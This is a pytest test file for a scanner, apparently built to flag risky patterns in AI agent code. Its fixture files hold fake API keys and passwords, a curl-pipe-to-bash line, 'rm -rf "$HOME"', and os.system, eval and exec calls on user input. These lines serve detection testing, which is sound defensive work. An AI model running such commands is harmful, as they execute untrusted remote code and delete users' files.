from pathlib import Path

from agent_risk_scanner.scanner import scan_path


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def test_detects_api_key_and_env_credential(tmp_path: Path):
    (tmp_path / "app.py").write_text(
        'OPENAI_API_KEY = "sk-test-12345678901234567890"\n', encoding="utf-8"
    )
    (tmp_path / ".env").write_text(
        "DATABASE_PASSWORD=very-secret-password\n", encoding="utf-8"
    )

    findings = scan_path(tmp_path)

    assert "SECRET_API_KEY" in rule_ids(findings)
    assert "SECRET_ENV_CREDENTIAL" in rule_ids(findings)
    assert all("very-secret-password" not in finding.snippet for finding in findings)


def test_detects_dangerous_commands(tmp_path: Path):
    (tmp_path / "agent.py").write_text(
        "import os\ncommand = input()\nos.system(command)\n", encoding="utf-8"
    )
    (tmp_path / "install.sh").write_text(
        "curl https://example.test/install.sh | bash\nrm -rf /tmp/demo\n",
        encoding="utf-8",
    )

    findings = scan_path(tmp_path)
    ids = rule_ids(findings)

    assert "EXEC_OS_SYSTEM" in ids
    assert "SHELL_REMOTE_PIPE" in ids
    assert "SHELL_RECURSIVE_DELETE" in ids


def test_detects_quoted_home_directory_delete(tmp_path: Path):
    (tmp_path / "cleanup.sh").write_text('rm -rf "$HOME"\n', encoding="utf-8")

    findings = scan_path(tmp_path)

    assert "FS_DELETE_USER_HOME" in rule_ids(findings)


def test_scans_relevant_hidden_directories_and_honors_exclusions(tmp_path: Path):
    plugin_dir = tmp_path / ".codex-plugin"
    plugin_dir.mkdir()
    plugin_file = plugin_dir / "unsafe.py"
    plugin_file.write_text("eval(user_input)\n", encoding="utf-8")
    generated_report = tmp_path / "report.md"
    generated_report.write_text("exec(user_input)\n", encoding="utf-8")

    findings = scan_path(tmp_path, exclude_paths={generated_report})

    assert any(finding.file_path == ".codex-plugin/unsafe.py" for finding in findings)
    assert all(finding.file_path != "report.md" for finding in findings)
